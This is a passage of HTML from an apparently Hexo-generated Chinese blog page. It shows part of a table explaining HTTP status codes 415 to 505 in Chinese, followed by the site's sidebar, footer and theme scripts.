<td>Unsupported Media Type</td>
<td>服务器无法处理请求附带的媒体格式</td>
</tr>
<tr>
<td>416</td>
<td>Requested range not satisfiable</td>
<td>客户端请求的范围无效</td>
</tr>
<tr>
<td>417</td>
<td>Expectation Failed</td>
<td>服务器无法满足Expect的请求头信息</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error</td>
<td>服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td>501</td>
<td>Not Implemented</td>
<td>服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td>502</td>
<td>Bad Gateway</td>
<td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td>503</td>
<td>Service Unavailable</td>
<td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td>504</td>
<td>Gateway Time-out</td>
<td>充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td>505</td>
<td>HTTP Version not supported</td>
<td>服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/17/%E7%BD%91%E9%A1%B5%E7%8A%B6%E6%80%81%E7%A0%81/" data-id="clrmsspo30007j0u4bbvacsvu" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">next &amp;raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Hexo</h1>
    <h2 class="blog-subtitle"></h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
    <h2 class="author">John Doe</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2023 - 2024 John Doe<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  
<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">

  
<script src="/plugin/galmenu/GalMenu.js"></script>

  <div class="GalMenu GalDropDown">
      <div class="circle" id="gal">
        <div class="ring">
          
            <a href="/" title="" class="menuItem">首页</a>
          
            <a href="/tags" title="" class="menuItem">标签</a>
          
            <a href="/categories" title="" class="menuItem">分类</a>
          
            <a href="/archives" title="" class="menuItem">归档</a>
          
            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
          
            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
          
        </div>
        
          <audio id="audio" src="#"></audio>
        
      </div> 
</div>
<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
    for (var i = 0,
    l = items.length; i < l; i++) {
      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
    }</script>
<script type="text/javascript">
  $(document).ready(function() {
    $('body').GalMenu({
      'menu': 'GalDropDown'
    })
  });
</script>

  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>